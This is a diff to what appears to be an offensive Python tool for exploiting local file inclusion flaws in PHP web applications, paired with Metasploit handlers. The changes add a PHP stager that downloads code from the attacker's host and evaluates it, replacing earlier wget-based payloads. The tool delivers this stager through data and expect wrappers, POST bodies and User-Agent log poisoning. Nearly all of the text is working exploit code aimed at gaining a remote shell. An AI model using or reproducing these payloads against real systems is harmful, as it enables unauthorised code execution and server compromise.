@@ -16,6 +16,7 @@ from os import system
 
 t = Terminal()
 
+stager_payload = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
 
 def progressbar():
 
@@ -76,7 +77,7 @@ class Data:
                 payload = payload_file.read()
                 payload_file.close()
             else:
-                payload = "<?php system('wget http://{0}:8000/{1}.php'); ?>".format(lhost, shell)
+                payload = stager_payload.format(lhost, shell)
             encoded_payload = quote_plus(payload.encode('base64'))
 
             # Build data wrapper
@@ -88,7 +89,6 @@ class Data:
 
             if self.nostager:
                 progressbar()
-                raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
             else:
                 # Assuming if there is a server running on port 8000 hosting from /tmp
                 print(t.red(" [!] ") + "Is Your Server Running?")
@@ -96,6 +96,7 @@ class Data:
                 print(t.green(" [*] ") + "Downloading Shell")
                 progressbar()
 
+            raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
             # LFI payload that downloads the shell
             data_request = requests.get(lfi)
 
@@ -155,20 +156,21 @@ class Input:
             payload = payload_file.read()
             payload_file.close()
         else:
-            payload = "<?php system('wget http://{0}:8000/{1}.php'); ?>".format(lhost,shell)
+            payload = stager_payload.format(lhost,shell)
 
         handle = Payload(lhost, lport, self.target, shell)
         handle.handler()
 
         if self.nostager:
             progressbar()
-            raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler Is Running ...")
         else: 
             # Assuming if there is a server running on port 8000 hosting from /tmp
             print(t.red(" [!] ") + "Is Your Server Running?")
             print(t.yellow(" [*] ") + "To Launch Server: http-server /tmp -p 8000")
             print(t.green(" [*] ") + "Downloading Shell")
             progressbar()
+
+        raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler Is Running ...")
 
         try:
             dr = requests.post(url, data=payload)
@@ -224,13 +226,14 @@ class Expect:
             payload += "\" | php"
             payload_file.close()
             progressbar()
-            raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
         else:
-            payload = "expect://wget http://{0}:8000/{1}.php".format(lhost, shell)
+            payload = "expect://echo \""+stager_payload.format(lhost, shell)+"\" | php"
             print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
             print(t.green(" [*] ") + "Downloading Shell")
             progressbar()
         lfi = self.target + payload
+
+        raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
 
         try:
             r = requests.get(lfi)
@@ -284,14 +287,14 @@ class Logs:
             payload = "<?php eval(base64_decode('{0}')); ?>".format(payload_file.read().encode('base64').replace("\n", ""))
             payload_file.close()
             progressbar()
-            raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
         else:
-            payload = "<?php system('wget http://{0}:8000/{1}.php') ?>".format(lhost, shell)
+            payload = stager_payload.format(lhost, shell)
             print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
             print(t.green(" [*] ") + "Downloading Shell")
             progressbar()
         lfi = self.target + self.location
 
+        raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
         try:
             headers = {'User-Agent': payload}
             r = requests.get(lfi, headers=headers)
